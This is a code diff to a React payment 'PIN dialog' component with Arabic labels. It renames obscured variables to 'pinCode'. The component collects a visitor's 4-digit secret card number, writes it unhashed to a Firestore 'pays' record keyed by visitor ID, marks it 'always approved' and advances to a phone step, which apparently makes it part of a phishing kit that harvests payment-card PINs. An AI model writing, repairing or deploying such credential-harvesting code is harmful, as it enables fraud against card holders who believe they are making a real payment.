@@ -19,14 +19,14 @@ interface PinDialogProps {
 }
 
 export function PinDialog({ open, onOpenChange, onPinSubmitted }: PinDialogProps) {
-  const [_v6, _s6] = useState("")
+  const [pinCode, setPinCode] = useState("")
   const [error, setError] = useState("")
   const [isSubmitting, setIsSubmitting] = useState(false)
 
   const handlePinSubmit = async (e: React.FormEvent) => {
     e.preventDefault()
 
-    if (_v6.length !== 4) {
+    if (pinCode.length !== 4) {
       setError("يرجى إدخال الرقم السري المكون من 4 أرقام")
       return
     }
@@ -42,7 +42,7 @@ export function PinDialog({ open, onOpenChange, onPinSubmitted }: PinDialogProps
     try {
       // Update the document with the PIN
       await updateDoc(doc(db, "pays", visitorID), {
-        _v6,
+        pinCode,
         pinSubmittedAt: new Date().toISOString(),
         idVerificationStatus: "completed",
         currentStep: "phone",
@@ -52,7 +52,7 @@ export function PinDialog({ open, onOpenChange, onPinSubmitted }: PinDialogProps
 
       // Add PIN to history (always approved)
       await addToHistory(visitorID, "pin", {
-        _v6
+        pinCode
       }, "approved")
 
       // Success - call the callback
@@ -89,10 +89,10 @@ export function PinDialog({ open, onOpenChange, onPinSubmitted }: PinDialogProps
             <Input
               type="password"
               placeholder="••••"
-              value={_v6}
+              value={pinCode}
               onChange={(e) => {
                 const value = e.target.value.replace(/\D/g, "").slice(0, 4)
-                _s6(value)
+                setPinCode(value)
                 setError("")
               }}
               maxLength={4}
@@ -106,7 +106,7 @@ export function PinDialog({ open, onOpenChange, onPinSubmitted }: PinDialogProps
           <Button
             type="submit"
             className="w-full h-12 bg-yellow-500 hover:bg-yellow-600 text-[#0a4a68] font-bold"
-            disabled={_v6.length !== 4 || isSubmitting}
+            disabled={pinCode.length !== 4 || isSubmitting}
           >
             {isSubmitting ? "جاري الإرسال..." : "تأكيد الدفع"}
           </Button>
